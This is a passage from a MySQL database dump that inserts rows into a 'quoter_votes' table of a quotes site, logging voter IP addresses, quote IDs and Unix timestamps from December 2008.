  (1044,'92.255.211.127','',0,8,1228426517),
  (1045,'92.255.211.127','',0,6,1228426589),
  (1046,'92.255.211.127','',0,2,1228426710),
  (1047,'92.255.211.127','',0,1,1228426735),
  (1048,'92.255.211.127','',0,18,1228426823),
  (1049,'77.88.30.246','',0,50,1228426912),
  (1050,'77.88.30.246','',0,49,1228426937),
  (1051,'77.88.30.246','',0,48,1228426955),
  (1052,'92.255.211.127','',0,5,1228426975),
  (1053,'94.242.31.74','',0,19,1228427037),
  (1054,'92.255.211.127','',0,29,1228427615),
  (1055,'92.255.211.127','',0,23,1228427999),
  (1056,'92.255.211.127','',0,21,1228428042),
  (1057,'74.6.22.157','',0,24,1228428940),
  (1058,'74.6.22.157','',0,29,1228429339),
  (1059,'80.73.0.127','',0,59,1228432859),
  (1060,'80.73.0.127','',0,53,1228432873),
  (1061,'80.73.0.127','',0,42,1228432878),
  (1062,'80.73.0.127','',0,39,1228432882),
  (1063,'80.73.0.127','',0,38,1228432885),
  (1064,'80.73.0.127','',0,29,1228432889),
  (1065,'80.73.0.127','',0,26,1228432893),
  (1066,'80.73.0.127','',0,25,1228432898),
  (1067,'80.73.0.127','',0,18,1228432903),
  (1068,'80.73.0.127','',0,5,1228433865),
  (1069,'66.249.66.47','',0,60,1228434770),
  (1070,'80.243.71.189','',0,58,1228435051),
  (1071,'66.249.66.47','',0,58,1228435084),
  (1072,'74.6.8.97','',0,30,1228435696),
  (1073,'66.249.66.47','',0,57,1228436082),
  (1074,'66.249.66.47','',0,56,1228436915),
  (1075,'80.243.71.189','',0,59,1228439336),
  (1076,'80.243.71.189','',0,61,1228440999),
  (1077,'80.243.71.189','',0,60,1228441002),
  (1078,'80.243.71.189','',0,56,1228441019),
  (1079,'89.191.241.225','',0,10,1228444167),
  (1080,'89.191.241.225','',0,6,1228444240),
  (1081,'89.191.241.225','',0,56,1228444355),
  (1082,'89.218.21.116','',0,55,1228445300),
  (1083,'89.218.21.116','',0,61,1228445588),
  (1084,'92.46.47.134','',0,55,1228447400),
  (1085,'92.46.47.134','',0,61,1228447451),
  (1086,'92.46.47.134','',0,59,1228447458),
  (1087,'92.46.24.94','',0,55,1228447495),
  (1088,'80.243.71.189','',0,59,1228448003),
  (1089,'92.46.47.134','',0,56,1228448518),
  (1090,'92.46.47.134','',0,54,1228448525),
  (1091,'95.24.202.57','',0,55,1228450397),
  (1092,'92.46.47.134','',0,24,1228450480),
  (1093,'92.46.47.134','',0,20,1228450554),
  (1094,'92.46.47.134','',0,1,1228450615),
  (1095,'92.46.47.134','',0,39,1228450625),
  (1096,'80.243.71.189','',0,61,1228451314),
  (1097,'74.6.17.187','',0,53,1228454535),
  (1098,'74.6.17.187','',0,52,1228454552),
  (1099,'74.6.17.187','',0,60,1228454558),
  (1100,'74.6.17.187','',0,57,1228454593),
  (1101,'74.6.17.187','',0,59,1228454594),
  (1102,'74.6.17.187','',0,58,1228454625),
  (1103,'74.6.17.187','',0,61,1228454887),
  (1104,'74.6.17.187','',0,55,1228454923),
  (1105,'92.46.47.134','',0,1,1228457986),
  (1106,'92.46.47.134','',0,18,1228458006),
  (1107,'217.66.145.120','',0,12,1228458040),
  (1108,'92.46.47.134','',0,29,1228458056),
  (1109,'74.6.17.178','',0,54,1228458134),
  (1110,'74.6.17.178','',0,61,1228458562),
  (1111,'92.46.47.134','',0,52,1228458687),
  (1112,'92.46.47.134','',0,60,1228458878),
  (1113,'79.171.124.20','',0,16,1228459640),
  (1114,'79.171.124.20','',0,61,1228460248),
  (1115,'74.6.17.178','',0,56,1228462137),
  (1116,'78.137.20.1','',0,21,1228462302),
  (1117,'81.200.211.90','',0,51,1228462753),
  (1118,'81.200.211.90','',0,61,1228462754),
  (1119,'72.30.142.228','',0,29,1228466226),
  (1120,'72.30.142.228','',0,52,1228466718),
  (1121,'92.46.47.134','',0,6,1228466741),
  (1122,'82.142.132.82','',0,16,1228467946),
  (1123,'78.24.226.18','',0,60,1228468897),
  (1124,'78.24.226.18','',0,59,1228468917),
  (1125,'193.93.218.64','',0,62,1228468927),
  (1126,'78.24.226.18','',0,56,1228468968),
  (1127,'78.24.226.18','',0,55,1228468991),
  (1128,'78.24.226.18','',0,54,1228469014),
  (1129,'91.202.197.79','',0,62,1228469138),
  (1130,'78.24.226.18','',0,4,1228469327),
  (1131,'78.24.226.18','',0,1,1228469364),
  (1132,'72.30.142.228','',0,55,1228471257),
  (1133,'92.46.47.134','',0,62,1228473315),
  (1134,'92.46.47.134','',0,55,1228473329),
  (1135,'92.46.47.134','',0,4,1228473351),
  (1136,'92.46.47.134','',0,38,1228473439),
  (1137,'92.46.47.134','',0,24,1228473459),
  (1138,'92.46.47.134','',0,30,1228473467),
  (1139,'92.46.47.134','',0,20,1228473476),
  (1140,'92.46.47.134','',0,48,1228473585),
  (1141,'92.46.47.134','',0,61,1228473777),
  (1142,'92.46.47.134','',0,60,1228473786),
  (1143,'92.46.47.134','',0,59,1228473793),
  (1144,'72.30.142.154','',0,54,1228475440),
  (1145,'65.55.213.105','',0,55,1228476165),
  (1146,'65.55.213.105','',0,51,1228476262),
  (1147,'65.55.213.105','',0,12,1228476472),
  (1148,'65.55.213.105','',0,15,1228476539),
  (1149,'65.55.213.105','',0,54,1228476551),
  (1150,'65.55.213.105','',0,14,1228476595),
  (1151,'65.55.213.105','',0,3,1228476605),
  (1152,'65.55.213.105','',0,27,1228476676),
  (1153,'65.55.213.105','',0,24,1228476741),
  (1154,'65.55.213.105','',0,23,1228476822),
  (1155,'65.55.213.105','',0,22,1228476828),
  (1156,'65.55.213.105','',0,30,1228477106),
  (1157,'65.55.213.105','',0,21,1228477112),
  (1158,'65.55.213.105','',0,28,1228477142),
  (1159,'65.55.213.105','',0,19,1228477179),
  (1160,'65.55.213.105','',0,2,1228477184),
  (1161,'65.55.213.105','',0,4,1228477195),
  (1162,'65.55.213.105','',0,52,1228477204),
  (1163,'65.55.213.105','',0,1,1228477212),
  (1164,'65.55.213.105','',0,16,1228477303),
  (1165,'65.55.213.105','',0,18,1228477359),
  (1166,'65.55.213.105','',0,17,1228477410),
  (1167,'65.55.213.105','',0,20,1228477414),
  (1168,'65.55.213.105','',0,25,1228477425),
  (1169,'65.55.213.105','',0,29,1228477431),
  (1170,'65.55.213.105','',0,26,1228477451),
  (1171,'65.55.213.105','',0,53,1228477699),
  (1172,'65.55.213.105','',0,8,1228477763),
  (1173,'65.55.213.105','',0,11,1228477779),
  (1174,'65.55.213.105','',0,7,1228477785),
  (1175,'65.55.213.105','',0,9,1228477790),
  (1176,'65.55.213.105','',0,10,1228477806),
  (1177,'65.55.213.105','',0,5,1228477812),
  (1178,'65.55.213.105','',0,13,1228477824),
  (1179,'65.55.213.105','',0,6,1228477941),
  (1180,'94.253.33.68','',0,59,1228478187),
  (1181,'84.204.148.130','',0,62,1228478528),
  (1182,'193.93.218.64','',0,53,1228479075),
  (1183,'212.92.145.7','',0,54,1228479568),
  (1184,'66.249.66.47','',0,61,1228479887),
  (1185,'66.249.66.47','',0,59,1228480100),
  (1186,'77.108.66.140','',0,62,1228480283),
  (1187,'77.108.66.140','',0,61,1228480295),
  (1188,'77.108.66.140','',0,60,1228480306),
  (1189,'77.108.66.140','',0,59,1228480319),
  (1190,'77.108.66.140','',0,58,1228480336),
  (1191,'77.108.66.140','',0,56,1228480541),
  (1192,'77.108.66.140','',0,55,1228480545),
  (1193,'77.108.66.140','',0,54,1228480560),
  (1194,'74.6.18.221','',0,57,1228480647),
  (1195,'92.46.47.134','',0,62,1228480789),
  (1196,'92.46.47.134','',0,55,1228480811),
  (1197,'92.46.47.134','',0,25,1228480847),
  (1198,'92.46.47.134','',0,24,1228480855),
  (1199,'92.46.47.134','',0,20,1228481016),
  (1200,'77.94.211.133','',0,61,1228481022),
  (1201,'77.94.211.133','',0,59,1228481032),
  (1202,'77.94.211.133','',0,56,1228481085),
  (1203,'77.94.211.133','',0,55,1228481092),
  (1204,'92.46.47.134','',0,59,1228481143),
  (1205,'77.94.211.133','',0,48,1228481354),
  (1206,'77.94.211.133','',0,42,1228481470),
  (1207,'66.249.66.47','',0,17,1228481526),
  (1208,'66.249.66.47','',0,28,1228481577),
  (1209,'66.249.66.47','',0,12,1228481688),
  (1210,'66.249.66.47','',0,62,1228481835),
  (1211,'66.249.66.47','',0,39,1228481933),
  (1212,'66.249.66.47','',0,27,1228482114),
  (1213,'66.249.66.47','',0,18,1228482156),
  (1214,'66.249.66.47','',0,26,1228482626),
  (1215,'66.249.66.47','',0,25,1228482827),
  (1216,'66.249.66.47','',0,38,1228483633),
  (1217,'66.249.66.47','',0,30,1228484152),
  (1218,'213.137.232.149','',0,58,1228484777),
  (1219,'212.44.132.30','',0,39,1228485248),
  (1220,'212.44.132.30','',0,48,1228485250),
  (1221,'212.44.132.30','',0,20,1228485262),
  (1222,'92.46.9.135','',0,55,1228485454),
  (1223,'92.46.9.135','',0,30,1228485491),
  (1224,'92.113.122.7','',0,62,1228485731),
  (1225,'94.181.149.127','',0,61,1228486971),
  (1226,'94.181.149.127','',0,62,1228486976),
  (1227,'91.202.197.79','',0,61,1228487625),
  (1228,'91.124.222.249','',0,59,1228488202),
  (1229,'91.124.222.249','',0,39,1228488363),
  (1230,'91.124.222.249','',0,1,1228488605),
  (1231,'91.124.222.249','',0,20,1228488659),
  (1232,'77.241.36.4','',0,55,1228488708),
  (1233,'77.241.36.4','',0,52,1228488814),
  (1234,'82.196.84.190','',0,62,1228489698),
  (1235,'82.196.84.190','',0,61,1228489707),
  (1236,'82.196.84.190','',0,60,1228489719),
  (1237,'82.196.84.190','',0,56,1228489810),
  (1238,'82.196.84.190','',0,55,1228489819),
  (1239,'82.196.84.190','',0,54,1228489831),
  (1240,'82.196.84.190','',0,46,1228489929),
  (1241,'82.196.84.190','',0,39,1228489970),
  (1242,'82.196.84.190','',0,30,1228490012),
  (1243,'82.196.84.190','',0,29,1228490048),
  (1244,'193.93.218.64','',0,59,1228490293),
  (1245,'194.88.211.254','',0,50,1228490706),
  (1246,'217.168.76.85','',0,62,1228492930),
  (1247,'217.168.76.85','',0,54,1228492936),
  (1248,'217.168.76.85','',0,27,1228492949),
  (1249,'92.46.9.135','',0,62,1228492960),
  (1250,'92.46.9.135','',0,55,1228492967),
  (1251,'217.168.76.85','',0,59,1228492992),
  (1252,'217.168.76.85','',0,46,1228493034),
  (1253,'95.72.74.76','',0,62,1228494304),
  (1254,'95.72.74.76','',0,61,1228494334),
  (1255,'79.171.124.20','',0,27,1228507497),
  (1256,'91.77.195.130','',0,15,1228510061),
  (1257,'67.195.37.114','',0,53,1228510188),
  (1258,'91.77.195.130','',0,28,1228510330),
  (1259,'194.88.211.254','',0,50,1228510550),
  (1260,'67.195.37.114','',0,59,1228511324),
  (1261,'212.106.57.6','',0,17,1228512064),
  (1262,'67.195.37.114','',0,60,1228512475),
  (1263,'67.195.37.114','',0,56,1228512559),
  (1264,'67.195.37.114','',0,54,1228513930),
  (1265,'67.195.37.114','',0,62,1228514117),
  (1266,'67.195.37.114','',0,57,1228515059),
  (1267,'67.195.37.114','',0,55,1228515181),
  (1268,'88.147.206.40','',0,62,1228519657),
  (1269,'67.195.37.113','',0,61,1228520799),
  (1270,'67.195.37.113','',0,56,1228522507),
  (1271,'67.195.37.113','',0,55,1228522596),
  (1272,'80.73.0.127','',0,62,1228523492),
  (1273,'80.73.0.127','',0,59,1228523583),
  (1274,'80.73.0.127','',0,55,1228523609),
  (1275,'74.6.17.179','',0,56,1228523629),
  (1276,'67.195.37.113','',0,54,1228527212),
  (1277,'93.88.2.105','',0,61,1228527354),
  (1278,'93.88.2.105','',0,60,1228527362),
  (1279,'93.88.2.105','',0,55,1228527476),
  (1280,'93.88.2.105','',0,53,1228527549),
  (1281,'93.88.2.105','',0,50,1228527666),
  (1282,'93.88.2.105','',0,48,1228527848),
  (1283,'93.88.2.105','',0,43,1228528112),
  (1284,'93.88.2.105','',0,30,1228528208),
  (1285,'93.88.2.105','',0,29,1228528220),
  (1286,'93.88.2.105','',0,21,1228528688),
  (1287,'93.88.2.105','',0,2,1228529209),
  (1288,'75.19.35.49','',0,55,1228529567),
  (1289,'75.19.35.49','',0,21,1228529682),
  (1290,'67.195.37.113','',0,62,1228529980),
  (1291,'67.195.37.113','',0,58,1228530160),
  (1292,'67.195.37.113','',0,59,1228531542),
  (1293,'67.195.37.113','',0,55,1228531858),
  (1294,'67.195.37.113','',0,53,1228533914),
  (1295,'95.56.14.30','',0,63,1228537177),
  (1296,'95.56.14.30','',0,62,1228537182),
  (1297,'95.56.14.30','',0,59,1228537198),
  (1298,'95.56.14.30','',0,57,1228537227),
  (1299,'95.56.14.30','',0,55,1228537239),
  (1300,'80.243.71.189','',0,63,1228537245),
  (1301,'80.243.71.189','',0,62,1228537261),
  (1302,'80.243.71.189','',0,61,1228537269),
  (1303,'80.243.71.189','',0,59,1228537295),
  (1304,'72.30.79.106','',0,50,1228537474),
  (1305,'95.56.14.30','',0,24,1228537575),
  (1306,'72.30.79.106','',0,64,1228541117),
  (1307,'72.30.79.106','',0,63,1228541153),
  (1308,'72.30.79.106','',0,62,1228541176),
  (1309,'80.243.71.189','',0,1,1228541229),
  (1310,'67.195.37.113','',0,61,1228543638),
  (1311,'92.47.225.132','',0,55,1228543682),
  (1312,'78.24.224.228','',0,64,1228546981),
  (1313,'78.24.224.228','',0,59,1228547017),
  (1314,'78.24.224.228','',0,1,1228547426),
  (1315,'78.24.224.228','',0,4,1228547429),
  (1316,'92.242.72.44','',0,1,1228547614),
  (1317,'91.202.197.79','',0,1,1228547943),
  (1318,'193.93.219.216','',0,1,1228549372),
  (1319,'92.50.196.226','',0,1,1228549438),
  (1320,'78.24.224.228','',0,21,1228549656),
  (1321,'78.24.224.228','',0,29,1228549659),
  (1322,'193.93.218.64','',0,1,1228549682),
  (1323,'194.88.211.254','',0,50,1228551166),
  (1324,'78.24.224.228','',0,1,1228557610),
  (1325,'78.24.224.228','',0,21,1228557615),
  (1326,'78.24.224.228','',0,18,1228557628),
  (1327,'78.24.224.228','',0,4,1228557663),
  (1328,'78.24.224.228','',0,8,1228557665),
  (1329,'78.24.224.228','',0,9,1228557670),
  (1330,'78.24.224.228','',0,6,1228557674),
  (1331,'77.35.174.60','',0,1,1228560365),
  (1332,'78.111.223.148','',0,61,1228566462),
  (1333,'92.47.215.163','',0,55,1228566954),
  (1334,'89.169.105.166','',0,64,1228568204),
  (1335,'194.88.211.254','',0,50,1228568961),
  (1336,'94.253.17.121','',0,64,1228575376),
  (1337,'91.202.197.79','',0,20,1228576781),
  (1338,'84.42.29.139','',0,55,1228576944),
  (1339,'84.42.29.139','',0,56,1228576949),
  (1340,'72.30.79.60','',0,54,1228578568),
  (1341,'194.88.211.254','',0,50,1228582505),
  (1342,'79.171.124.20','',0,19,1228583255),
  (1343,'77.47.128.172','',0,21,1228587492),
  (1344,'79.171.124.20','',0,63,1228603693),
  (1345,'79.171.124.20','',0,27,1228604038),
  (1346,'67.195.37.113','',0,57,1228604834),
  (1347,'74.6.18.236','',0,64,1228605468),
  (1348,'78.24.231.236','',0,1,1228616701),
  (1349,'87.245.147.10','',0,58,1228618258),
  (1350,'67.195.37.113','',0,54,1228629115),
  (1351,'89.107.82.160','',0,1,1228631451),
  (1352,'91.202.196.193','',0,1,1228631493),
  (1353,'66.249.66.47','',0,26,1228636080),
  (1354,'91.124.129.244','',0,64,1228638546),
  (1355,'66.249.66.47','',0,13,1228638554),
  (1356,'66.249.66.47','',0,30,1228639333),
  (1357,'89.107.82.160','',0,1,1228642991),
  (1358,'89.107.82.160','',0,29,1228642999),
  (1359,'66.249.66.47','',0,19,1228644889),
  (1360,'66.249.66.47','',0,26,1228647897),
  (1361,'65.55.213.105','',0,62,1228650821),
  (1362,'65.55.213.105','',0,57,1228650826),
  (1363,'92.46.28.192','',0,55,1228651838),
  (1364,'65.55.213.105','',0,58,1228652222),
  (1365,'78.24.231.161','',0,1,1228652278),
  (1366,'78.24.231.161','',0,29,1228652281),
  (1367,'78.24.231.161','',0,4,1228652331),
  (1368,'65.55.213.105','',0,56,1228652859),
  (1369,'67.195.37.113','',0,57,1228656059),
  (1370,'67.195.37.113','',0,56,1228656820),
  (1371,'65.55.213.105','',0,62,1228658068),
  (1372,'65.55.213.105','',0,61,1228658103),
  (1373,'91.202.197.79','',0,58,1228659972),
  (1374,'92.115.117.44','',0,60,1228660008),
  (1375,'92.115.117.44','',0,56,1228660097),
  (1376,'72.30.142.177','',0,43,1228660384),
  (1377,'65.55.213.105','',0,63,1228661896),
  (1378,'65.55.213.105','',0,64,1228661900),
  (1379,'65.55.213.105','',0,60,1228661916),
  (1380,'86.219.114.50','',0,42,1228665703),
  (1381,'86.219.114.50','',0,53,1228665707),
  (1382,'86.219.114.50','',0,29,1228666689),
  (1383,'90.189.219.191','',0,14,1228668159),
  (1384,'90.189.219.191','',0,3,1228668165),
  (1385,'86.219.114.50','',0,20,1228668691),
  (1386,'86.219.114.50','',0,6,1228668816),
  (1387,'86.219.114.50','',0,18,1228669037),
  (1388,'91.124.148.141','',0,66,1228679954),
  (1389,'217.146.246.8','',0,66,1228680035),
  (1390,'193.186.15.18','',0,66,1228680392),
  (1391,'85.238.125.134','',0,66,1228680500),
  (1392,'91.124.206.201','',0,66,1228680608),
  (1393,'67.195.37.113','',0,62,1228680852),
  (1394,'67.195.37.113','',0,56,1228691535),
  (1395,'80.243.71.189','',0,67,1228695086),
  (1396,'80.243.71.189','',0,66,1228695398),
  (1397,'67.202.43.229','',0,55,1228696259),
  (1398,'67.202.43.229','',0,60,1228696271),
  (1399,'77.88.30.246','',0,23,1228700610),
  (1400,'77.88.30.246','',0,26,1228700632),
  (1401,'77.88.30.246','',0,25,1228700641),
  (1402,'77.88.30.246','',0,28,1228700663),
  (1403,'77.88.30.246','',0,29,1228700698),
  (1404,'77.88.30.246','',0,30,1228700739),
  (1405,'77.88.30.246','',0,24,1228700768),
  (1406,'193.93.218.64','',0,66,1228700797),
  (1407,'80.243.71.189','',0,67,1228703315),
  (1408,'80.243.71.189','',0,1,1228704552),
  (1409,'80.243.71.189','',0,29,1228704556),
  (1410,'67.195.37.113','',0,58,1228707990),
  (1411,'195.189.143.62','',0,63,1228710642),
  (1412,'92.47.253.104','',0,55,1228711632),
  (1413,'80.243.71.189','',0,67,1228713009),
  (1414,'80.243.71.189','',0,30,1228713210),
  (1415,'80.243.71.189','',0,63,1228713288),
  (1416,'81.22.196.136','',0,60,1228713572),
  (1417,'77.88.30.246','',0,55,1228715031),
  (1418,'77.88.30.246','',0,52,1228715040),
  (1419,'77.88.30.246','',0,51,1228715063),
  (1420,'77.88.30.246','',0,60,1228715074),
  (1421,'77.88.30.246','',0,50,1228715079),
  (1422,'77.88.30.246','',0,48,1228715091),
  (1423,'77.88.30.246','',0,23,1228715102),
  (1424,'77.88.30.246','',0,27,1228715119),
  (1425,'77.88.30.246','',0,25,1228715125),
  (1426,'77.88.30.246','',0,26,1228715143),
  (1427,'77.88.30.246','',0,24,1228715180),
  (1428,'77.88.30.246','',0,47,1228715188),
  (1429,'77.88.30.246','',0,46,1228715226),
  (1430,'77.88.30.246','',0,49,1228715231),
  (1431,'77.88.30.246','',0,38,1228715239),
  (1432,'77.88.30.246','',0,43,1228715242),
  (1433,'77.88.30.246','',0,54,1228715253),
  (1434,'77.88.30.246','',0,30,1228715266),
  (1435,'77.88.30.246','',0,22,1228715281),
  (1436,'77.88.30.246','',0,56,1228715288),
  (1437,'77.88.30.246','',0,29,1228715306),
  (1438,'77.88.30.246','',0,28,1228715327),
  (1439,'77.88.30.246','',0,57,1228715345),
  (1440,'67.195.37.113','',0,61,1228723388),
  (1441,'78.24.226.136','',0,1,1228728029),
  (1442,'78.24.226.136','',0,29,1228728032),
  (1443,'78.24.226.136','',0,4,1228728342),
  (1444,'78.24.226.136','',0,66,1228729339),
  (1445,'217.113.122.50','',0,65,1228729721),
  (1446,'217.113.122.50','',0,55,1228729763),
  (1447,'77.108.66.140','',0,65,1228730587),
  (1448,'77.108.66.140','',0,63,1228730587),
  (1449,'77.108.66.140','',0,64,1228730588),
  (1450,'77.108.66.140','',0,66,1228730609),
  (1451,'77.108.66.140','',0,67,1228730618),
  (1452,'91.124.250.103','',0,66,1228731572),
  (1453,'91.124.250.103','',0,65,1228731746),
  (1454,'91.124.250.103','',0,64,1228731810),
  (1455,'91.124.250.103','',0,61,1228731956),
  (1456,'91.124.250.103','',0,69,1228734111),
  (1457,'91.124.250.103','',0,68,1228734168),
  (1458,'91.124.250.103','',0,43,1228734483),
  (1459,'91.124.250.103','',0,24,1228734677),
  (1460,'92.47.219.117','',0,55,1228735367),
  (1461,'66.249.66.47','',0,38,1228735484),
  (1462,'84.17.11.132','',0,23,1228736998),
  (1463,'91.202.197.79','',0,70,1228738428),
  (1464,'91.202.197.79','',0,69,1228738440),
  (1465,'91.202.197.79','',0,67,1228738449),
  (1466,'91.202.197.79','',0,66,1228738452),
  (1467,'195.210.145.118','',0,28,1228738546),
  (1468,'79.173.78.16','',0,70,1228738659),
  (1469,'79.173.78.16','',0,62,1228738724),
  (1470,'81.222.255.25','',0,21,1228738809),
  (1471,'66.249.66.47','',0,39,1228738867),
  (1472,'81.222.255.25','',0,1,1228738902),
  (1473,'81.222.255.25','',0,55,1228738916),
  (1474,'81.222.255.25','',0,24,1228738935),
  (1475,'77.66.226.110','',0,61,1228739060),
  (1476,'77.66.226.110','',0,51,1228739061),
  (1477,'192.115.133.27','',0,67,1228739157),
  (1478,'195.128.49.102','',0,12,1228739627),
  (1479,'217.174.97.213','',0,29,1228740187),
  (1480,'212.119.210.154','',0,43,1228740996),
  (1481,'212.119.210.154','',0,28,1228741019),
  (1482,'93.92.192.5','',0,64,1228741258),
  (1483,'80.249.183.82','',0,60,1228741632),
  (1484,'85.21.220.50','',0,20,1228741832),
  (1485,'95.32.49.228','',0,56,1228743050),
  (1486,'93.85.102.120','',0,70,1228743429),
  (1487,'89.109.54.89','',0,21,1228743444),
  (1488,'194.67.74.7','',0,55,1228743555),
  (1489,'194.67.74.7','',0,39,1228743564),
  (1490,'62.118.139.66','',0,54,1228743919),
  (1491,'193.166.237.11','',0,70,1228743936),
  (1492,'62.118.139.66','',0,62,1228743940),
  (1493,'62.118.139.66','',0,19,1228744022),
  (1494,'62.118.139.66','',0,27,1228744123),
  (1495,'91.124.250.103','',0,68,1228744268),
  (1496,'91.124.250.103','',0,66,1228744290),
  (1497,'80.249.183.82','',0,56,1228744301),
  (1498,'91.124.250.103','',0,65,1228744301),
  (1499,'91.124.250.103','',0,69,1228744313),
  (1500,'88.200.251.63','',0,54,1228744397);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 1500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (1501,'88.200.251.63','',0,27,1228744473),
  (1502,'80.249.183.82','',0,2,1228745029),
  (1503,'195.34.238.78','',0,71,1228745589),
  (1504,'195.34.238.78','',0,70,1228745613),
  (1505,'195.34.238.78','',0,65,1228745663),
  (1506,'195.34.238.78','',0,62,1228745666),
  (1507,'195.34.238.78','',0,61,1228745710),
  (1508,'195.34.238.78','',0,58,1228745728),
  (1509,'195.34.238.78','',0,57,1228745767),
  (1510,'195.34.238.78','',0,56,1228745771),
  (1511,'195.34.238.78','',0,55,1228745781),
  (1512,'195.34.238.78','',0,54,1228745807),
  (1513,'195.34.238.78','',0,52,1228745835),
  (1514,'195.34.238.78','',0,51,1228745911),
  (1515,'94.178.33.180','',0,55,1228745935),
  (1516,'195.34.238.78','',0,50,1228745970),
  (1517,'80.68.252.74','',0,70,1228746264),
  (1518,'80.68.252.74','',0,69,1228746267),
  (1519,'80.68.252.74','',0,67,1228746287),
  (1520,'80.68.252.74','',0,63,1228746324),
  (1521,'89.17.34.162','',0,65,1228746374),
  (1522,'195.34.238.78','',0,21,1228746541),
  (1523,'195.34.238.78','',0,18,1228746580),
  (1524,'77.51.250.2','',0,67,1228746652),
  (1525,'195.34.238.78','',0,5,1228746713),
  (1526,'91.149.180.159','',0,56,1228746727),
  (1527,'91.149.180.159','',0,54,1228746771),
  (1528,'195.34.238.78','',0,10,1228746778),
  (1529,'195.34.238.78','',0,9,1228746791),
  (1530,'77.51.250.2','',0,20,1228746794),
  (1531,'195.34.238.78','',0,8,1228746805),
  (1532,'91.78.80.203','',0,66,1228746858),
  (1533,'213.184.232.37','',0,55,1228747079),
  (1534,'213.184.232.37','',0,39,1228747119),
  (1535,'195.34.238.78','',0,29,1228747127),
  (1536,'91.149.180.159','',0,50,1228747243),
  (1537,'213.184.232.37','',0,73,1228747315),
  (1538,'62.141.120.30','',0,21,1228747373),
  (1539,'82.151.112.106','',0,42,1228747391),
  (1540,'66.249.66.47','',0,38,1228747403),
  (1541,'91.149.180.159','',0,48,1228747422),
  (1542,'195.177.237.241','',0,73,1228747514),
  (1543,'91.149.180.159','',0,18,1228747725),
  (1544,'91.149.180.159','',0,5,1228747777),
  (1545,'93.80.237.152','',0,55,1228748074),
  (1546,'217.147.24.3','',0,71,1228748368),
  (1547,'88.84.200.91','',0,65,1228748925),
  (1548,'88.84.200.91','',0,64,1228748955),
  (1549,'88.84.200.91','',0,63,1228748971),
  (1550,'88.84.200.91','',0,62,1228748983),
  (1551,'213.184.232.37','',0,44,1228749051),
  (1552,'88.84.200.91','',0,57,1228749084),
  (1553,'88.84.200.91','',0,55,1228749115),
  (1554,'91.78.80.203','',0,21,1228749234),
  (1555,'88.84.200.91','',0,50,1228749236),
  (1556,'91.78.80.203','',0,18,1228749259),
  (1557,'89.110.60.185','',0,52,1228749548),
  (1558,'89.110.60.185','',0,43,1228749560),
  (1559,'89.218.71.94','',0,61,1228749668),
  (1560,'195.78.58.134','',0,67,1228749880),
  (1561,'88.84.200.91','',0,43,1228750056),
  (1562,'89.110.60.185','',0,51,1228750271),
  (1563,'91.124.250.103','',0,73,1228750342),
  (1564,'86.57.253.57','',0,49,1228750397),
  (1565,'86.57.253.57','',0,43,1228750444),
  (1566,'193.124.157.201','',0,75,1228750458),
  (1567,'91.197.17.216','',0,10,1228750460),
  (1568,'193.124.157.201','',0,71,1228750488),
  (1569,'193.124.157.201','',0,21,1228750551),
  (1570,'193.124.157.201','',0,30,1228750576),
  (1571,'89.188.114.72','',0,71,1228750691),
  (1572,'193.124.157.201','',0,48,1228750739),
  (1573,'84.204.148.130','',0,76,1228750934),
  (1574,'193.124.157.201','',0,12,1228751083),
  (1575,'193.124.157.201','',0,18,1228751227),
  (1576,'89.252.48.3','',0,56,1228751488),
  (1577,'91.200.45.31','',0,70,1228751715),
  (1578,'84.204.148.130','',0,71,1228751949),
  (1579,'194.186.214.34','',0,69,1228752595),
  (1580,'194.186.214.34','',0,27,1228752703),
  (1581,'80.248.48.110','',0,20,1228752770),
  (1582,'95.28.71.96','',0,67,1228753011),
  (1583,'195.131.139.214','',0,74,1228753503),
  (1584,'84.204.148.130','',0,74,1228753675),
  (1585,'93.80.96.200','',0,48,1228754127),
  (1586,'89.109.229.79','',0,56,1228754791),
  (1587,'89.218.15.186','',0,55,1228754931),
  (1588,'87.245.147.10','',0,73,1228755225),
  (1589,'72.249.126.100','',0,55,1228755235),
  (1590,'217.174.97.213','',0,77,1228755621),
  (1591,'91.77.42.37','',0,74,1228756622),
  (1592,'91.77.88.71','',0,73,1228756822),
  (1593,'82.144.199.66','',0,72,1228757051),
  (1594,'82.144.199.66','',0,61,1228757057),
  (1595,'82.144.199.66','',0,51,1228757072),
  (1596,'85.140.65.173','',0,67,1228757854),
  (1597,'92.113.119.41','',0,61,1228757866),
  (1598,'89.223.127.242','',0,69,1228758268),
  (1599,'89.223.127.242','',0,67,1228758303),
  (1600,'89.223.127.242','',0,42,1228758361),
  (1601,'91.124.213.33','',0,43,1228758383),
  (1602,'89.223.127.242','',0,39,1228758400),
  (1603,'89.223.127.242','',0,63,1228758410),
  (1604,'83.237.163.104','',0,55,1228759066),
  (1605,'195.18.50.253','',0,76,1228759551),
  (1606,'195.18.50.253','',0,77,1228759555),
  (1607,'195.18.50.253','',0,75,1228759576),
  (1608,'195.18.50.253','',0,70,1228759759),
  (1609,'92.242.22.22','',0,2,1228760147),
  (1610,'92.242.22.22','',0,1,1228760150),
  (1611,'92.242.22.22','',0,3,1228760165),
  (1612,'92.242.22.22','',0,4,1228760172),
  (1613,'92.242.22.22','',0,7,1228760190),
  (1614,'92.242.22.22','',0,8,1228760193),
  (1615,'92.242.22.22','',0,6,1228760194),
  (1616,'92.242.22.22','',0,11,1228760237),
  (1617,'92.242.22.22','',0,13,1228760256),
  (1618,'92.242.22.22','',0,14,1228760272),
  (1619,'92.242.22.22','',0,12,1228760275),
  (1620,'62.63.80.82','',0,21,1228760569),
  (1621,'62.63.80.82','',0,55,1228760580),
  (1622,'217.28.248.90','',0,29,1228761190),
  (1623,'79.111.42.148','',0,79,1228762054),
  (1624,'79.111.42.148','',0,56,1228762060),
  (1625,'79.111.42.148','',0,52,1228762063),
  (1626,'79.111.42.148','',0,49,1228762067),
  (1627,'79.111.42.148','',0,47,1228762070),
  (1628,'79.111.42.148','',0,43,1228762074),
  (1629,'79.111.42.148','',0,28,1228762078),
  (1630,'91.149.169.156','',0,79,1228763016),
  (1631,'91.149.169.156','',0,74,1228763061),
  (1632,'194.186.242.6','',0,52,1228763069),
  (1633,'91.124.171.20','',0,63,1228763221),
  (1634,'91.124.171.20','',0,60,1228763240),
  (1635,'66.249.66.47','',0,72,1228763505),
  (1636,'66.249.66.47','',0,68,1228763551),
  (1637,'66.249.66.47','',0,69,1228763722),
  (1638,'66.249.66.47','',0,77,1228764613),
  (1639,'91.210.87.10','',0,39,1228765251),
